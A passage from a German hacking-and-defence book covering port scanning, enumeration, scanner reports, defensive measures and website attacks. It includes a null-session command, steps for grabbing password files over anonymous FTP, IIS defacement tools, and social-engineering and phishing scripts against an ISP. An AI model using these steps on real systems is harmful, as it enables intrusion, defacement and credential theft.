oder auch bei schlecht gesicherten externen Netzwerkrechnern umfasst die Auswertung mehr als ein Dutzend DIN-A4-Seiten mit Angaben \u00fcber MACAdresse(n), Shares, Benutzerkonten, Patchlevel des Betriebssystems, laufende Dienste, Passwortrichtlinien und vieles mehr.\nBild 14.38: Ausgesprochen auskunftsfreudig: Winfingerprint\nIn diesem Fall er\u00fcbrigt sich meist der letzte Schritt vor dem eigentlichen Angriff: die Enumeration. Enumeration hei\u00dft auf Deutsch Aufz\u00e4hlung, wird aber sinngem\u00e4\u00df besser mit Auswertung \u00fcbersetzt. Ausgewertet wird vorzugsweise die Reaktion des Systems auf einen aktiven Zugriff. Zur grundlegenden Auswertungstechnik z\u00e4hlt hier das BannerGrabbing: Der Angreifer baut \u00fcber einen der angezeigten offenen Ports eine Verbindung zur Gegenstelle auf und analysiert den Output. Altbew\u00e4hrt ist hier das \u00fcber die Kommandozeile zu startende Windows-Utility telnet.exe. Beim SoftPerfect Network Scanner kann man das Protokoll durch einen Klick auf die rechte Maustaste aktivieren.\n204\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nTelnet funktioniert mit g\u00e4ngigen Anwendungen, die auf den Portnummern 80, 25 oder 21 laufen.\nBild 14.39: Telnet-Anfrage \u00fcber Port 80\nAnschlie\u00dfend erh\u00e4lt man ein leeres Telnet-Kommandofenster, wo man einige beliebige Angaben macht und das Ergebnis beobachtet:\nBild 14.40: Ergebnis der Telnet-Abfrage\nMan sieht hier, dass am anderen Ende ein Apache-Server unter Linux/SUSE l\u00e4uft. Zur selben Information k\u00e4me man auch durch die Benutzung von Netcat, dem \u00bbTCP/IPSchweizer-Taschenmesser\u00ab und gleichzeitigen Schrecken aller Netzwerkadministratoren. Von den meisten Securityprogrammen, inklusive Firewalls, wird es deshalb auch als Sch\u00e4dling eingestuft. Will man es trotzdem benutzen, muss man es ausdr\u00fccklich freigeben bzw. einige Online-Schutzmechanismen lockern.\n14.2 Portscanning, Fingerprinting und Enumeration\n205\nBild 14.41: Einbrechen mit dem Schweizer Taschenmesser Netcat\nMit Bordmitteln wie ftp.exe k\u00f6nnen wir feststellen, wie der entsprechende Service am offenen Port 21 der Zieladresse reagiert. Eine FTP-Verbindung l\u00e4sst sich relativ einfach aufbauen, und wenn wir erst mal im System drin sind, stehen uns die klassischen Dateimanipulatoren zur Verf\u00fcgung.\nBild 14.42: Zugriffsversuch auf den Zielrechner \u00fcber FTP\nWem das Arbeiten mit FTP auf Kommandoebene weniger liegt, der kann hier auch auf eine grafische Clientsoftware zur\u00fcckgreifen, z. B. auf den FTP-Client von BulletProof69. Und zum \u00dcben gibt es auf www.ftp-sites.org jede Menge offener FTP-Server, wo man entweder \u00fcberhaupt keinen Benutzernamen braucht oder sich mit der Kombination \u00bbanonymous / e-mailadresse\u00ab anmelden kann. Die Basis der Datei- und Druckerfreigabe von Windows ist das Protokoll Microsoft Server Message Block, abgek\u00fcrzt SMB. Eine zentrale Schwachstelle in der Implementierung dieses Protokolls erm\u00f6glicht den ber\u00fcchtigten Null-Session-Angriff auf dem TCPPort 139, womit auf die versteckten IPC$-Freigaben zugegriffen werden soll.\n69\nhttp://www.bpftp.com\n206\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nSpezielle Werkzeuge, um diese Schwachstelle zu testen, sind nicht n\u00f6tig. Haben wir einen offenen Port 139 oder 445 gefunden, reicht die Eingabe des Befehls: c:\\>net use \\\\IP.Adresse\\IPC$ \"\" /u:\"\", um uns als Standardnutzer (/u:\"\") mit dem Null-Passwort70 (\"\") an der versteckten Interprocess-Communications-Freigabe (IPC$) anzumelden. Wurde der Befehl erfolgreich durchgef\u00fchrt, kann man sich mit net view \\\\Computername die Freigaben anschauen.\nBild 14.43: Freigaben anzeigen mit net view\nWer es weniger kompliziert mag, kann auch auf NetBIOS-Attacken spezialisierte Scanner zur\u00fcckgreifen, etwa Legion71 oder FX-Scanner (etwas schwieriger zu finden, beispielsweise hier: www.freesoft-board.to/downloads/security-scanner/5/fx-scanner-521), der nebenbei das Internet auch gleich noch nach der Unicode-L\u00fccke bei \u00e4lteren IIS-Servern durchforstet. Eine weitere Alternative ist der vielseitige Netbrute Scanner (www.rawlogic.com), mit dem sich zus\u00e4tzlich klassische Portscans und Webschwachstellenanalysen durchf\u00fchren lassen.\n14.2.3 Security Scanner NetBIOS- und knapp ein Dutzend weitere interessante Schwachstellen durchleuchtet der skriptgesteuerte und leider nicht mehr weiterentwickelte Omega Scanner72. Er markiert bereits die Schwelle zu den Security Scannern. Die hier beschriebenen Scanningund Auswertungstechniken funktionieren zwar in gewissem Umfang nach wie vor, aber erfordern auch ein h\u00f6heres Ma\u00df an Systemkenntnissen, und vor allem Zeit. Die vielen notwendigen Einzelschritte von der Portauswahl \u00fcber das Fingerprinting bis zu den unterschiedlichsten Enumerationstechniken zusammenzufassen, z\u00e4hlen heute mehr und 70\nDas Sonderzeichen \"\u00bb\" erreicht man im DOS-Fenster mit der Tastenkombination Alt+0187.\n71\nhttp://www.packetstormsecurity.org\n72\nwww2.packetstormsecurity.org/cgi-bin/search/search.cgi?searchvalue=omega&type=archives&[search].x= 0&[search].y=0\n14.2 Portscanning, Fingerprinting und Enumeration\n207\nmehr zur Aufgabe von Security Scannern. Der Omega Scanner ist, weil skriptgesteuert, ein guter Einstieg ins Thema. Nachdem ein Angriffsskript geladen wurde, z. B. der Wingate Scanner, durchforstet das Tool selbst gro\u00dfe IP-Bereiche mit ca. 7 IPs/sec. Wer also seinen Server mit der WinGate-Firewall abgesichert hat, ohne die Standardparameter sicher konfiguriert zu haben, dem droht Ungemach: Fehlerhaft konfigurierte Proxys werden wie auf einem Silbertablett pr\u00e4sentiert und k\u00f6nnen mit einer Telnet-Verbindung kompromittiert werden.\nBild 14.44: Mehr Security Scanner als Portscanner\nNoch einen Schritt weiter geht der aus unserer Sicht sehr effizient arbeitende X-Scan aus der chinesischen Hackerschmiede xfocus.net, da er die unterschiedlichsten Angriffe parallel fahren kann.\n208\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nBild 14.45: Konfigurationsmen\u00fc von X-Scan\nDie Konfiguration ist aufgeteilt in globale Optionen und Plugin-Optionen. Global werden u. a. die eingesetzten Module (siehe Abbildung), die Scan-/Zugriffsgeschwindigkeit (\u00fcber Anzahl der Threads und Anzahl der Parallelscans) und die Reportingoptionen definiert; bei den Plugins werden die zu scannenden Ports, die gew\u00fcnschten Enumerationstechniken sowie die f\u00fcr Brute-Force-Attacken benutzten W\u00f6rterb\u00fccher spezifiziert. Beim Scan selbst k\u00f6nnen durchaus mehr als 255 IP-Adressen \u00fcberpr\u00fcft werden, was sich dann nicht empfiehlt, wenn man z. B. alle Plugins aktiviert hat, da X-Scan dann je IPAdresse durchaus mehrere Sekunden braucht. Sowohl f\u00fcr Hacker als auch f\u00fcr SecurityProfis sind die zutage gef\u00f6rderten Schwachstellen daf\u00fcr aber sehr aussagekr\u00e4ftig.\n14.2 Portscanning, Fingerprinting und Enumeration\n209\nBild 14.46: X-Scan bei der Schwachstellenanalyse\nDie Scanergebnisse kann man sich dann auch als HTML-Report anzeigen lassen. Die Qualit\u00e4t der Enumeration ist beeindruckend. Zuerst folgt eine Auflistung der \u00fcber TCP oder ICMP gefundenen Hosts.\n210\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nBild 14.47: Durch X-Scan aufgedeckte Sicherheitsl\u00fccken\nDie Hosts mit gravierenden Sicherheitsl\u00fccken (rot aufgelistet) werden zuerst aufgelistet. In unserem etwa halb- bis dreiviertelst\u00fcndigen Scan wurden \u2022\n18 ansprechbare Hosts mit 10 gravierenden Sicherheitsl\u00fccken,\n\u2022\n23 Sicherheitswarnungen und\n\u2022\n135 Sicherheitsanmerkungen\ndetektiert. Die gravierendsten Sicherheitsl\u00fccken (und aus Sicht eines potenziellen Angreifers auch die interessantesten) sind: Port / Service\nBeschreibung\nunknown (1812/tcp)\nRadius Server entdeckt, der es gegebenenfalls erm\u00f6glicht, eine Root-Shell auf dem System einzurichten\nwww (443/tcp)\nVeraltete (\u00e4lter als 0.9.6k oder 0.9.7.c) OpenSSL-Implementierung, die das System f\u00fcr Remoteangriffe anf\u00e4llig macht.\nftp (21/tcp)\nFTP-Password: \"ftp/[Blank password] bzw. FTP-Password: \"anonymous/[Blank password]\n14.2 Portscanning, Fingerprinting und Enumeration\n211\nPort / Service\nBeschreibung\nunknown (44337/tcp)\nVeralteter Kerio Mailserver (< 6.0.9) mit Anf\u00e4lligkeiten gegen\u00fcber Passwortcrackern und DoS-Attacken\nmicrosoft-ds (445/tcp)\nL\u00fccke, die es m\u00f6glich macht, sich am Remote Host mit dem Login \"e\" und dem Passwort \"asd#321\" einzuloggen\nSelbst weniger versierte Hacker sollten es auf die eine oder andere Weise, zum Teil auch mit den weiter oben beschriebenen Tools schaffen, in diese Rechner einzudringen. Die Sicherheitswarnungen sind diffiziler auszubeuten, z. B. die Warnung von f\u00fcr Cache Poisoning anf\u00e4lligen Namensservern. Noch genauere Analysen erm\u00f6glicht ein nachgeschalteter Scan mit einem klassischen Security-Scanner wie QualysGuard Vulnerability Management73, Nessus, GFI LanGuard oder dem Shadow Security Scanner74. Man erkennt nat\u00fcrlich schnell, warum solche \u00bbSchlachtschiffe\u00ab, die \u00fcber einige zehntausend, in kurzen Abst\u00e4nden auch aktualisierte Plugins und Angriffsskripts verf\u00fcgen, sinnvollerweise nur zum Scannen kleiner IPBereiche eingesetzt werden sollten; es dauert ansonsten einfach zu lange, bis verwertbare Ergebnisse vorliegen. Wir haben eine von X-Scan monierte IP-Adresse herausgegriffen und \u00fcberpr\u00fcft. Der Check mit der Freeware-Version von N-Stalker75 dauerte circa 45 Minuten. Ob die pr\u00e4ziseren Ergebnisse aus Sicht eines potenziellen Angreifers den Zeitaufwand lohnen, sei an der Stelle mal dahingestellt.\nBild 14.48: Nachgeschalteter Schwachstellen-Scan mit einem Profiscanner\n73\nwww.qualys.com\n74\nwww.safety-lab.com\n75\nwww.nstalker.com\n212\n14.3\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nAbwehrma\u00dfnahmen gegen Portscanner & Co.\nObwohl wir es einige Male schon betont haben: Portscanning, Fingerprinting & Enumeration m\u00f6gen der Vorbereitung eines klassischen Angriffs dienen (DoS-Attacke, \u00dcbernahme des Admin-Kontos, Einrichten einer Remote-Shell etc.), sind aber mindestens in Deutschland zum Zeitpunkt der Drucklegung \u2013 sofern kein Vorsatz im Spiel ist \u2013 noch nicht kriminell. Trotzdem wecken sie nicht zu Unrecht Bedenken und \u00c4ngste bei den Anwendern. Aber auch Administratoren sehen es \u00fcberhaupt nicht gern, wenn ihre Firmennetze von au\u00dfen \u00bbdurchleuchtet\u00ab werden. Was kann man also tun, um den oben aufgef\u00fchrten Gefahren von Portscannern wirkungsvoll zu begegnen? Pauschal l\u00e4sst sich die Frage nicht beantworten, denn sie stellt sich f\u00fcr den Anwender eines Heimnetzwerks anders als f\u00fcr den Administrator eines Firmennetzes. Privatanwender sind mit dem Internet h\u00e4ufig \u00fcber ein (DSL-)Modem oder \u2013 wenn sie mehrere internettaugliche Rechner miteinander vernetzt haben \u2013 auch in Kombination mit einem Router verbunden. In beiden F\u00e4llen kommt es darauf an, die eigene Sicherheitslage zu analysieren, also insbesondere zu kl\u00e4ren, welche Ports mit welchen Diensten von au\u00dfen erreichbar sind. Allein daf\u00fcr existieren viele Dutzend Tools. Selbst mit Bordmitteln wie netstat kann man sich anzeigen lassen, welche Dienste auf welchen Ports lauschen bzw. aktiv senden und empfangen.\nBild 14.49: Offene Ports mit Netstat.exe anzeigen lassen\nBesonders komfortabel ist das nicht, hier bietet z. B. der kostenlos erh\u00e4ltliche Local Portscanner (z. B. auf www.zdnet.de) einen besseren \u00dcberblick:\n14.3 Abwehrma\u00dfnahmen gegen Portscanner & Co.\n213\nBild 14.50: Schnelle \u00dcbersicht \u00fcber kritische Ports mit dem Local Port Scanner\nDer gr\u00f6\u00dfte Vorteil dieses Tools: Es pr\u00fcft auf Wunsch auch, ob spezielle Trojaner-Ports offen sind. Einen noch pr\u00e4ziseren \u00dcberblick \u00fcber die gerade aktuellen Netzwerkverbindungen und ihre Zuordnung zu Programmen, Protokollen und Portnummern bietet der in dieser Hinsicht konkurrenzlose Port Explorer.\n214\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\nBild 14.51: Port Explorer\nVor allem hat man auch die M\u00f6glichkeit, genau zu sehen, welche Daten auf welchen Ports nach drau\u00dfen gehen bzw. von drau\u00dfen kommen. Selbst durch Rootkits getarnte Remoteverbindungen lassen sich mit diesem Tool aufdecken. Au\u00dferdem k\u00f6nnen nat\u00fcrlich auch die schon im vorangegangenen Kapitel vorgestellten Portscanner benutzt werden. Der einzige Sch\u00f6nheitsfehler: Portscanner, die auf dem lokalen System eingesetzt werden, zeigen h\u00e4ufig offene Ports, die von au\u00dfen nicht sichtbar und auch nicht sicherheitsrelevant sind, weil eine in den Router integrierte Firewall oder eine Desktop-Firewall diese Ports dicht macht. Wer wissen will, wie anf\u00e4llig sein System gegen einen von au\u00dfen durchgef\u00fchrten Portscan wirklich ist, wird seinen Rechner am besten \u00fcbers Internet scannen lassen. Den ersten Test76 machen wir mit Shields Up, einem kostenfreien Service unter www.grc.com. Das Ergebnis in unserem Fall ist beruhigend, wenngleich nicht eigentlich \u00fcberraschend:\n76\n\u00c4hnliche Tests gibt es auch bei http://security.symantec.com/sscv6/default.asp?langid=ie&venid=sym oder noch ausf\u00fchrlicher unter: http://www.i-eye.net/online_scanner/scanner1.php\n14.3 Abwehrma\u00dfnahmen gegen Portscanner & Co.\n215\nBild 14.52: Den Rechner von au\u00dfen scannen lassen\nVon 1056 Ports sind 1046 geschlossen, der Rest gestealtht. Vereinfacht ausgedr\u00fcckt gibt der angepingte Host keine Antwort zur\u00fcck. Das Resultat ist deswegen nicht verwunderlich, weil unser kleines Heimnetzwerk \u00fcber einen NAT-Router ins Internet geht und au\u00dferdem eine Desktop-Firewall hier ihren Dienst verrichtet. Spannend wird es erst dann, wenn keine Firewall eingesetzt wird, die die offenen Ports nach au\u00dfen schlie\u00dft oder filtert. Die einfachste M\u00f6glichkeit, dann deren potenzielle Sicherheitsrisiken in den Griff zu bekommen, ist das Schlie\u00dfen von Diensten, die dieses Fenster nach drau\u00dfen offen halten, obwohl sie nicht gebraucht werden. Im Internet finden sich dazu etliche brauchbare Abhandlungen, u. a. auch auf www.ntsvcfg.de/kss_xp/kss_xp.html#xp2. Leider ersetzt das Deaktivieren von Windows-Diensten nicht in jedem Fall eine Firewall. Ohne den Glaubenskrieg f\u00fcr und gegen die Personal Firewall wieder aufleben zu lassen: Das gezielte manuelle oder automatische Abschalten von scheinbar nicht ben\u00f6tigten Services f\u00fchrt nicht selten zu Frust. Je weniger einer weiss und je beh\u00e4nder er klickt, desto katastrophaler das Ergebnis. Ein Sicherheitsgewinn l\u00e4sst sich zwar mitunter verbuchen, leider funktionieren dann bestimmte andere, von den deaktivierten Diensten abh\u00e4n-\n216\nKapitel 14 \u2013 Szenario III: Spurensucher im Netz\ngende Programme nicht mehr. Hier beginnt dann oft eine m\u00fchevolle Suche und ein l\u00e4stiges Nachtuning. Hat man hingegen als Privatanwender ein eigenes Netzwerk installiert, kann man die meisten Tipps zur Dienstekonfiguration sowieso vergessen: Die meisten inkriminierten Dienste, z. B. der NetBIOS-Support, werden schlichtweg f\u00fcr die Datei- und Druckerfreigabe im Netz ben\u00f6tigt. Unser Generaltipp an der Stelle an die Adresse der Privatanwender: Investieren Sie in einen guten Router mit integrierter Firewall und installieren Sie zus\u00e4tzlich (d. h. auch zum Schutz vor Trojanern und RATs, die nach Hause telefonieren wollen) eine Desktop-Firewall77. Die zweite grundlegende Ma\u00dfnahme, zu der in dem Zusammenhang gerade mit Windows-Clients geraten werden kann, ist der systematische Scan nach bekannten fehlerhaften Sicherheitskonfigurationen f\u00fcr Windows 2000, Windows XP, Windows Server 2003, Internet Information Server (IIS) 5.0 und 6.0, SQL Server 7.0 und 2000, Internet Explorer (IE) 5.01 und h\u00f6her sowie Office 2000, 2002 und 2003. Diese \u00dcberpr\u00fcfung wird durch den Microsoft Baseline Security Analyzer (kostenfrei bei Microsoft) vorgenommen, der den Rechner au\u00dferdem nach fehlenden Sicherheitsupdates, Updaterollups und Service Packs durchsucht, die auf Microsoft Update bereitgestellt werden.\nBild 14.53: Sicherheitsupdates und -Patches mit dem MBSA einspielen\n77\nWeiterf\u00fchrende Hinweise finden Sie auch in meinem Buch (Peter Kraft. Anti-Hackerz Book 2007, speziell das Kapitel 7 \u00fcber Firewalls).\n14.3 Abwehrma\u00dfnahmen gegen Portscanner & Co.\n217\nF\u00fcr Netzwerk- und Systemadministratoren stellt sich die Situation sehr viel differenzierter dar. Ping-Attacken (\u00fcber ICMP, TCP und UDP) k\u00f6nnen mitunter nicht vollst\u00e4ndig abgeblockt, sondern m\u00fcssen teilweise durch die Firewall weitergeleitet werden. Auf jeden Fall aber sollten Ping-Attacken protokolliert werden, da sie mitunter nur die Vorhut eines ernsthaften Angriffs darstellen. F\u00fcr Portscans gilt Vergleichbares. Neben entsprechend konfigurierten Firewalls kommen hier insbesondere IDS-Programme wie Snort78 in Betracht. Viel wichtiger als diese generelle Prophylaxe ist nat\u00fcrlich das Beheben der von Security Scannern aufgedeckten L\u00fccken. Denn die gr\u00f6\u00dfte Verwundbarkeit der Hostrechner resultiert h\u00e4ufig aus fehlkonfigurierten Diensten, dem Einsatz veralteter Protokolle, fehlender Sicherheitsupdates, ungepatchter Webserver oder mangelhaft umgesetzter Sicherheitsrichtlinien, z. B. f\u00fcr die Passwortvergabe. Besser man unterzieht sich einem regelm\u00e4\u00dfigen Security Audit (und b\u00fcgelt die M\u00e4ngel systematisch aus), statt einem Angreifer die M\u00f6glichkeit einzur\u00e4umen, diese Schw\u00e4che gezielt auszunutzen. Security Scanner wie X-Scan, OpenVAS, Nessus, GFI Languard und andere k\u00f6nnen zwar f\u00fcr Angriffe genutzt werden, sind aber in der Hand eines erfahrenen Administrators ein kaum zu ersetzendes Verteidigungswerkzeug.\n78\nhttp://www.snort.com\n219\n15 Szenario IV: Web Attack Ausgangsszenario: Mit viel M\u00fche haben Sie eine eigene Webseite erstellt und ver\u00f6ffentlicht. Ein besonderes Highlight der Seite ist das Diskussionsforum, wo Sie engagiert mitdiskutieren. Aus irgendeinem Grund, den Sie sp\u00e4ter kaum noch rekonstruieren k\u00f6nnen, f\u00fchlt sich ein Teilnehmer missverstanden. Jedenfalls f\u00e4llt Ihnen kein anderer Grund als Erkl\u00e4rung daf\u00fcr ein, dass jemand Ihre Seite brutal verunstaltet hat.\n15.1\nDefacements\nAls Defacement bezeichnet man in Hackerkreisen das Entstellen (engl. = de-face) bzw. Verunzieren von fremden Webseiten. Manche Hacker haben daraus ein richtiges Hobby gemacht und verewigen sich mit ihren Kunstwerken dann im Digital Attacks Archive auf www.zone-H.org. Die Motive sind durchaus unterschiedlicher Natur: Die einen versuchen, mit dem Defacement auf politische oder sonstige Missst\u00e4nde aufmerksam zu machen. Andere Angreifer wollen schlichtweg nur ihr K\u00f6nnen vor der \u00d6ffentlichkeit unter Beweis stellen. Nach einem erfolgreich durchgef\u00fchrten Angriff pr\u00e4sentiert sich dann vor allem die Haupt- oder Indexseite mit neuem Gesicht. Die Angreifer nutzen dabei gezielt Sicherheitsl\u00fccken auf den Webservern bzw. den Webapplikationen (Forensoftware, PHPAnwendungen wie Joomla und Mambo) aus und/oder erobern den Webserver durch einen Brute-Force- oder Dictionary-Angriff.\n15.2\nXSS-Angriffe\nNebenbei wird dann oft noch die Gelegenheit genutzt, von den eroberten Seiten aus Spam und Malware zu verbreiten. Erreicht wird dies durch einen XSS-Angriff (Cross Site Scripting). Betroffen sind alle Webseiten mit dynamischen, aus Datenbanken generierten Seiteninhalten. Der Zugriff auf diese Seiten erfolgt \u00fcber eine Skriptsprache wie Perl, PHP oder JSP. Der Angreifer schleust nun eigenen Code in die Datenbankabfrage (SQL-Injection), um die Ausf\u00fchrung der urspr\u00fcnglichen Skripts durch eigene zu ersetzen. Eine Anwendungsm\u00f6glichkeit dieser Technik besteht beispielsweise im Zweckentfremden von Feedbackformularen, die zu Spamschleudern umfunktioniert werden.\n15.3\nAngriff der W\u00fcrmer\nGoogle-Hacks und Portscans, die wir mitsamt den zugeh\u00f6rigen Tools in den vorangegangenen Kapiteln vorgestellt haben, dienen dabei als wirkungsvolle Angriffsvorberei-\n220\nKapitel 15 \u2013 Szenario IV: Web Attack\ntung. Noch schwerwiegendere Angriffe aufs Web sind allerdings Wurmattacken. Beispielsweise versetzte im Jahr 2003 der nur 376 Byte gro\u00dfe Wurm Helkern (alias Slammer) die Internetwelt in Angst und Schrecken. Helkern griff ungepatchte Server an, die unter dem Datenbanksystem Microsoft SQL Server 2000 liefen, klinkte sich dort mittels Buffer Overrun ins Steuerungssystem f\u00fcr Datenbanken ein und verbreitete sich von dort via Kopie weiter. Wenn man \u00fcberlegt, dass der Microsoft SQL Server eine der verbreitetsten Datenbanken auf Webservern ist, wird das Gefahrenpotenzial deutlich.\n15.4\nDoS- und DDoS-Attacken\nZu den wirkungsvollsten Webattacken \u00fcberhaupt geh\u00f6ren DoS- bzw. DDoS-Attacken, dazu zwei aktuelle Beispiele: \u2022\nKirgisien Durch eine DOS-Attacke, die vermutlich von der lokalen Geheimpolizei gesteuert wurde, hatten ca. 400.000 User erhebliche Probleme bei der Internetnutzung. Hintergrund: Mit dieser Aktion sollte eine \u00fcbers Internet koordinierte Informationskampagne pro-demokratischer Gruppen f\u00fcr eine ehrliche Wahl in Kirgisien gestoppt werden.\n\u2022\nSpam from Russia Seit August 2006 registrierten unabh\u00e4ngige Beobachter eine massive Zunahme von Spam, die von Ru\u00dfland aus \u00fcber ein Botnetz von etwa 73.000 PCs gesteuert wurde. Das Ganze ist nicht ohne Ironie, da die Zombierechner, die ihre Spams in mehr als 166 L\u00e4nder ausstreuten, fast alle in den USA beheimatet waren.\nIm Folgenden wollen wir einige Beispiele aus der Praxis diskutieren. Wie gehen Angreifer vor, wenn sie Webseiten korrumpieren, manipulieren oder sich illegalen Zugriff auf gesch\u00fctzte Inhalte verschaffen? Ausgangspunkt f\u00fcr Angriffe bilden meistens Portscans und/oder die ber\u00fchmt-ber\u00fcchtigten Google-Hacks. Um nicht Zeit und Rechnerressourcen zu verschwenden, wird man sich als Newbie diejenigen Webadressen herauspicken, die eine oder mehrere erkennbare Schwachstellen aufweisen. Die \u00dcberlegung dabei: Wo eine gravierende L\u00fccke ist, lassen sich durchaus noch andere Schwachstellen finden und ausbeuten. In unserem Kapitel \u00fcber Google-Hacks haben wir einen der simpleren F\u00e4lle (FTP-Zugriff) beschrieben. Hier noch einmal die Kurzfassung in Form einer Ablaufgrafik:\n15.4 DoS- und DDoS-Attacken\n221\nBild 15.1: Eine Webseite hacken \u00fcber FTP-Zugriff\nAndere M\u00f6glichkeiten, sich via FTP-Zugriff auf eine fremde Webseite zu verschaffen, laufen \u00fcber den anonymen Login via FTP als anonymous, um sich dann \u2013 Sicherheitsl\u00fccken vorausgesetzt \u2013 die entsprechenden Passwortdateien auf den eigenen PC zu kopieren und lokal zu cracken. Eine spezielle Software ist nicht vonn\u00f6ten. Alles, was man braucht, bringt Windows von Haus aus mit. Und so geht\u2019s: In der Command-Shell starten wir den FTP-Client und \u00f6ffnen unsere Seite mit open IPAdresse.\n222\nKapitel 15 \u2013 Szenario IV: Web Attack\nBild 15.2: Zugriff auf FTP-Server\nWenn alles funktioniert, erhalten wir einen entsprechenden Hinweis, dass die Verbindung hergestellt wurde. Zugleich werden wir aufgefordert, die Logindaten (Benutzer + Kennwort) einzugeben. Bei vielen offenen oder halboffenen FTP-Servern funktioniert der erste Zugriff \u00fcber die Benutzerkennung anonymous +\n[[email protected]](/cdn-cgi/l/email-protection)\nals Passwort. Statt anonymous kann man sich oft auch als guest einloggen. Und wer jetzt noch MS-DOS kennt, ist entscheidend im Vorteil. Mit dir kann man sich den Verzeichnisinhalt anzeigen und mit cd die Verzeichnisebene wechseln.\nBild 15.3: Abgreifen der Passwortdatei\n15.4 DoS- und DDoS-Attacken\n223\nWenn wir in der Kommandozeile den Befehl pwd eingeben, erhalten wir den Speicherort dieser Datei angezeigt; wir wechseln in das Verzeichnis und kopieren die Passwortdatei mit dem Befehl get pwd in unser Rootverzeichnis \u2013 im Allgemeinen C:\\, wo wir uns dann n\u00e4her mit der Datei besch\u00e4ftigen k\u00f6nnen. Mit close oder quit schlie\u00dfen wir dann die Verbindung. Wenn man ohne grafischen FTP-Client arbeitet, braucht man f\u00fcr weitergehende Operationen eine Befehls\u00fcbersicht, die man z. B. auf www.moritzschubel.de/pc_ftp.html finden kann:\nBild 15.4: FTP-Befehle\n224\nKapitel 15 \u2013 Szenario IV: Web Attack\nDa die meisten Webserver aber entweder \u00fcber keinen anonymen FTP-Zugang verf\u00fcgen oder ihre Systeme entsprechend gepatcht haben, d\u00fcrfte die oben beschriebene Verfahrensweise so ziemlich der Vergangenheit angeh\u00f6ren. Apropos Vergangenheit: Bei den Versionen 4 und 5 des Microsoft Internet Information Server gab es zahlreiche gravierende L\u00fccken, z. B. in den Frontpage Serverextensions79. Hinzu kamen ein \u00fcberfl\u00fcssiges Script Mapping, in der Grundkonfiguration nicht gesetzte Berechtigungen80, provozierbare Puffer\u00fcberl\u00e4ufe in der Bearbeitung von Anfragen f\u00fcr Server Side Includes (z. B. .shtml, .stm und .shtm) und das Alptraumszenario schlechthin, in dem sich Nimda & Co. tummelten: die \u00bbUnicode Web Traversal\u00ab-Sicherheitsl\u00fccke, die es Angreifern erlaubt, mit einem konstruierten URL auf Web- und sonstige Verzeichnisse jedes beliebigen physikalischen Laufwerks lesend und schreibend zuzugreifen81. Mit anderen Worten: 2001 bis 2003 war das Eldorado der IIS-Attacker. Microsoft hat diese L\u00fccken durch Patches und Updates mittlerweile geschlossen, sofern die Administratoren jeweils nachgezogen sind. Nat\u00fcrlich findet man noch immer L\u00f6cher, die nicht gestopft sind. Nicht mehr ganz so aktuell, aber immer noch brauchbar, um diese Sicherheitsl\u00fccken auszubeuten, sind die Programme Azrael666 oder das mittlerweile im Netz nicht mehr auffindbare IIS Storm. Die typische Vorgehensweise sah so aus:\nBild 15.5: Internet Information Server defacen\n79\nz. B. www.microsoft.com/technet/security/bulletin/MS00-100.mspx\n80\nhttp://cert.uni-stuttgart.de/ms-iis5.php\n81\nmit Tipps, um diese L\u00fccken zu schlie\u00dfen: www.aspheute.com/artikel/20010926.htm\n15.4 DoS- und DDoS-Attacken\n225\nBild 15.6: Konfiguration von IIS Storm\nMit IIS Storm braucht man nicht lange zu tricksen. Mit dem Tool l\u00e4sst sich der Angriff \u00fcber einen Proxy steuern. Unicode-Exploits und Zugriff k\u00f6nnen \u2013 neben etlichen anderen Optionen \u2013 vom Angreifer in einer vorgegebenen Range konfiguriert werden. Alles, was man noch zum Testen braucht, ist eine vielversprechende IP-Adresse. Diese gibt man IIS Storm mit auf den Weg und erf\u00e4hrt, ob man als Angreifer gute Chancen hat, die Seite zu defacen.\nBild 15.7: Alles klar zum Defacen?\n226\nKapitel 15 \u2013 Szenario IV: Web Attack\n\u00c4hnlich arbeitet Azrael666. Nachdem man die IP-Adresse eines Servers eingegeben hat, der unter einer ungepatchten IIS-Version 4 oder 5 l\u00e4uft, kann man testweise einige Angriffsszenarien ausprobieren und dann zur Attacke schreiten. Im Attackmodus stehen die entsprechenden Skripts bereit, und nach einem endg\u00fcltigen Check, ob man wirklich verbunden ist, kann man loslegen und die Seite des Opfers entstellen bzw. unbrauchbar machen.\nBild 15.8: Testen und Attackieren mit Azrael666\n15.4 DoS- und DDoS-Attacken\n227\nBild 15.9: Konfiguration des Angriffs\nEin anderes Werkzeug ist der Sharp Defacer, der nicht die vielfach ausgemerzten Schw\u00e4chen der IIS-Server ausnutzt, sondern PHP-basierte Webserver angreift.\n228\nKapitel 15 \u2013 Szenario IV: Web Attack\nBild 15.10: Sharp Defacer: Defacement im Automatikmodus\nWenn diese Methoden nichts fruchten oder man zu lange braucht, um eine dieser \u00e4lteren Schwachstellen auch heute noch zu entdecken, kann sich der Angreifer auf das Social Engineering oder eine Brute-Force-Attacke verlegen.\n15.5\nUltima Ratio \u2013 Social Engineering oder Brute Force?\nBeim Social Engineering kommen unterschiedliche Vorgehensweisen in Betracht, wobei die zentrale Frage immer lautet: Wer kennt die Logindaten f\u00fcr den FTP-Zugriff? Das ist nat\u00fcrlich neben dem User auch sein ISP (Internet Service-Provider), der ihm diese Daten irgendwann einmal zugemailt hat. Dieses Dreieck User \u2013 ISP \u2013 Mail-Acount bildet unser Angriffsziel.\n15.5 Ultima Ratio \u2013 Social Engineering oder Brute Force?\n229\nSocial Engineering Variante 1 Wir rufen die ISP-Hotline an und beantragen unter einem plausibel klingenden Vorwand das erneute Zusenden der Logindaten. Parallel dazu haben wir einen neuen E-MailAccount eingerichtet, der so \u00e4hnlich lautet wie der echte des Users, z. B.\n[[email protected]](/cdn-cgi/l/email-protection)\nstatt\n[[email protected]](/cdn-cgi/l/email-protection)\n. Wenn wir hingegen wissen, dass das Opfer noch die Frontpage Server Extensions (obwohl sie von Microsoft nicht mehr unterst\u00fctzt werden) nutzt, besteht die Wahrscheinlichkeit, dass \u00fcberhaupt kein FTP-Zugang freigeschaltet ist. Also beantragen wir die Freischaltung mit der Bitte um Zusendung der Logindaten an unsere (neue) E-Mail-Adresse. Social Engineering Variante 2 Wir schicken dem Opfer eine offiziell aussehende E-Mail (von seinem ISP) mit der Bitte, seine Logindaten zu verifizieren. Anschlie\u00dfend greifen wir seine Daten \u00fcber eine pr\u00e4parierte Webseite ab: ein 